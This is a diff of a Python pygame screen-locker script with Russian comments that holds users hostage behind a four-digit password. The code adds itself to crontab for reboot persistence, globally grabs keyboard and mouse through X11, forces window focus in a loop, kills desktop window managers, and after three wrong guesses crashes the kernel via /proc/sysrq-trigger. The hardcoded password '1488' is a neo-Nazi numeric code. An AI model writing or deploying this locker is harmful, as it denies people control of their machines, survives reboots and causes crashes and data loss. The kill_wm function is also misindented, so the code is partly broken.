@@ -3,52 +3,84 @@ import os, sys, time, threading, subprocess, shlex
 import pygame
 from pygame.locals import *
 
-# ---------- автозагрузка (добавление в crontab) ----------
+# ---------- автозагрузка ----------
 def add_to_crontab():
     script_path = os.path.abspath(__file__)
     cmd = f"@reboot /usr/bin/python3 {shlex.quote(script_path)} &"
-    # проверим, есть ли уже такая запись
     try:
         existing = subprocess.check_output(["crontab", "-l"], stderr=subprocess.DEVNULL).decode()
     except:
         existing = ""
     if cmd not in existing:
-        # добавляем
         with open("/tmp/crontab_new", "w") as f:
             f.write(existing.strip() + "\n" + cmd + "\n")
         subprocess.call(["crontab", "/tmp/crontab_new"])
         os.unlink("/tmp/crontab_new")
-        print("[+] Добавлено в автозагрузку (crontab).")
 
-# ---------- блокировка системных комбинаций через X11 ----------
-def grab_keyboard():
+# ---------- жесткий захват ввода через X11 ----------
+def hard_grab():
     try:
         import Xlib.display
         d = Xlib.display.Display()
         root = d.screen().root
+        # Захват клавиатуры и мыши с Async – всё равно все события идут к нам
         root.grab_keyboard(True, Xlib.X.GrabModeAsync, Xlib.X.GrabModeAsync,
                            Xlib.X.CurrentTime)
+        root.grab_pointer(True, Xlib.X.ButtonPressMask | Xlib.X.ButtonReleaseMask | Xlib.X.PointerMotionMask,
+                          Xlib.X.GrabModeAsync, Xlib.X.GrabModeAsync, Xlib.X.NONE, Xlib.X.NONE, Xlib.X.CurrentTime)
         d.sync()
+        # Также можно запретить передачу событий другим окнам
+        Xlib.X.AllowEvents(d, Xlib.X.AsyncKeyboard, Xlib.X.CurrentTime)
+        Xlib.X.AllowEvents(d, Xlib.X.AsyncPointer, Xlib.X.CurrentTime)
     except Exception as e:
-        print("Не удалось захватить клавиатуру:", e)
+        print("Ошибка захвата:", e)
 
-# ---------- громкий звук (крик) ----------
-def play_loud_sound():
+# ---------- принудительное удержание фокуса ----------
+def force_focus():
+    try:
+        import Xlib.display
+        d = Xlib.display.Display()
+        root = d.screen().root
+        # Ищем наше окно по имени
+        win_id = None
+        for win in root.query_tree().children:
+            name = win.get_wm_name()
+            if name == "LOCKED":
+                win_id = win
+                break
+        if win_id:
+            while True:
+                win_id.set_input_focus(Xlib.X.RevertToParent, Xlib.X.CurrentTime)
+                d.sync()
+                time.sleep(0.1)
+    except:
+        pass
+
+# ---------- убить оконный менеджер (чтобы не было панели) ----------
+def kill_wm():
+    # раскомментируй, если хочешь полностью убить DE – опасно, но эффективно
+     subprocess.call(["pkill", "-f", "gnome-shell"])
+     subprocess.call(["pkill", "-f", "kwin"])
+     subprocess.call(["pkill", "-f", "xfwm4"])
+    pass
+
+# ---------- звук ----------
+def play_sound():
     subprocess.run(["amixer", "set", "Master", "100%"], capture_output=True)
     subprocess.run(["aplay", "/usr/share/sounds/alsa/Front_Center.wav"], capture_output=True)
 
 # ---------- kernel panic ----------
-def trigger_kernel_panic():
+def panic():
     with open("/proc/sysrq-trigger", "w") as f:
         f.write("c")
 
-# ---------- ПАРОЛЬ ----------
+# ---------- настройки ----------
 PASSWORD = "1488"
 MAX_ATTEMPTS = 3
 attempts_left = MAX_ATTEMPTS
 input_buffer = ""
 
-# ---------- инициализация Pygame ----------
+# ---------- pygame ----------
 pygame.init()
 info = pygame.display.Info()
 screen = pygame.display.set_mode((info.current_w, info.current_h),
@@ -56,20 +88,21 @@ screen = pygame.display.set_mode((info.current_w, info.current_h),
 pygame.display.set_caption("LOCKED")
 pygame.mouse.set_visible(False)
 
-# захват клавиатуры (чтобы Alt+Tab и т.п. не работали)
-grab_keyboard()
+# Захват ввода (глобальный)
+hard_grab()
 
-# шрифт
+# Запуск потока для удержания фокуса
+threading.Thread(target=force_focus, daemon=True).start()
+
+# Убить WM (если нужно)
+kill_wm()
+
+# шрифты
 font = pygame.font.SysFont("monospace", 28, bold=True)
 font_small = pygame.font.SysFont("monospace", 22)
+BLACK = (0,0,0); GREEN = (0,255,0); RED = (255,0,0); WHITE = (255,255,255)
 
-BLACK = (0, 0, 0)
-GREEN = (0, 255, 0)
-RED   = (255, 0, 0)
-WHITE = (255, 255, 255)
-
-# ---------- отрисовка ----------
-def draw_screen():
+def draw():
     screen.fill(BLACK)
     txt = font.render("YOU ARE LOCKED. GUESS 4-DIGIT PASSWORD", True, GREEN)
     screen.blit(txt, (screen.get_width()//2 - txt.get_width()//2, 50))
@@ -84,13 +117,12 @@ def draw_screen():
         screen.blit(txt_key, (screen.get_width()//2 - txt_key.get_width()//2, 210 + i*40))
     pygame.display.flip()
 
-# ---------- запуск автозагрузки ----------
+# ---------- добавление в автозагрузку ----------
 add_to_crontab()
 
 # ---------- главный цикл ----------
 running = True
-draw_screen()
-
+draw()
 while running:
     for event in pygame.event.get():
         if event.type == KEYDOWN:
@@ -103,29 +135,24 @@ while running:
                     input_buffer = ""
                     attempts_left -= 1
                     if attempts_left <= 0:
-                        draw_screen()
-                        threading.Thread(target=play_loud_sound, daemon=True).start()
+                        draw()
+                        threading.Thread(target=play_sound, daemon=True).start()
                         for i in range(10):
-                            color = RED if i % 2 == 0 else WHITE
-                            screen.fill(color)
-                            pygame.display.flip()
-                            time.sleep(0.1)
-                        screen.fill(BLACK)
-                        pygame.display.flip()
-                        threading.Timer(5.0, trigger_kernel_panic).start()
+                            color = RED if i%2==0 else WHITE
+                            screen.fill(color); pygame.display.flip(); time.sleep(0.1)
+                        screen.fill(BLACK); pygame.display.flip()
+                        threading.Timer(5.0, panic).start()
                         running = False
                     else:
-                        draw_screen()
+                        draw()
             elif event.key == K_BACKSPACE:
-                input_buffer = input_buffer[:-1]
-                draw_screen()
-            elif event.key in (K_0, K_1, K_2, K_3, K_4, K_5, K_6, K_7, K_8, K_9):
+                input_buffer = input_buffer[:-1]; draw()
+            elif event.key in (K_0,K_1,K_2,K_3,K_4,K_5,K_6,K_7,K_8,K_9):
                 if len(input_buffer) < 4:
-                    input_buffer += chr(event.key)
-                    draw_screen()
+                    input_buffer += chr(event.key); draw()
         if event.type == QUIT:
-            pass   # игнор
+            pass
 
-# если вышли – висеть до перезагрузки
+# бесконечный цикл после провала
 while True:
     time.sleep(1)
